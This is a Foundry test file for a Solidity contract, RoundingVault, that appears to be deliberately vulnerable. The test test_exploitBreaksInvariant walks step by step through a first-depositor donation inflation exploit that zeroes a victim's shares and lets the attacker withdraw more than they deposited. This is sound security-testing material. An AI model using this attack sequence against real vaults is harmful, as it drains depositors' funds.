// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/RoundingVault.sol";

contract RoundingVaultTest is Test {
    RoundingVault vault;
    address attacker = address(0xA11CE);
    address victim = address(0xB0B);
    address alt = address(0xCAFE);

    function setUp() public {
        vault = new RoundingVault();
    }

    function test_invariantHoldsAtSeed() public {
        assertTrue(vault.invariantHolds());
    }

    /// Multi-step first-depositor / donation inflation exploit:
    /// 1. Attacker deposits 1_000 -> 1_000 shares (first depositor).
    /// 2. Attacker donates 1_000_000 -> inflates share price.
    /// 3. Victim deposits 1_000 -> floor(1_000*1_000/1_001_000) = 0 shares.
    /// 4. Attacker transfers shares (burns a fee, reduces totalShares only).
    /// 5. Attacker withdraws remaining shares -> payout > their deposit.
    /// 6. totalWithdrawn > totalDeposited -> invariant BROKEN.
    function test_exploitBreaksInvariant() public {
        vm.prank(attacker);
        vault.deposit(); // 1_000 shares, totalDeposited=1_000

        vm.prank(attacker);
        vault.donate(1_000_000); // totalAssets=1_001_000

        vm.prank(victim);
        vault.deposit(); // 0 shares (floor), totalDeposited=2_000

        vm.startPrank(attacker);
        vault.transferShares(alt, 100); // fee=0 (100*50/10000=0)
        vault.transferShares(alt, 200); // fee=1, totalShares -= 1
        uint256 payout = vault.withdraw(700);
        vm.stopPrank();

        assertGt(payout, 1_000e6 / 1e6, "exploit must net more than attacker deposited");
        assertFalse(vault.invariantHolds(), "withdrawn > deposited must break invariant");
    }

    function test_nearMissKeepsInvariantIntact() public {
        vm.startPrank(attacker);
        vault.deposit(); // 1_000 shares, 1_000 assets, totalDeposited=1_000
        vault.transferShares(alt, 500); // fee=2, net=498
        uint256 payout = vault.withdraw(500);
        vm.stopPrank();

        assertLe(payout, 1_000e6, "near-miss must not drain vault");
        assertTrue(vault.invariantHolds(), "invariant must hold for a near-miss");
    }
}
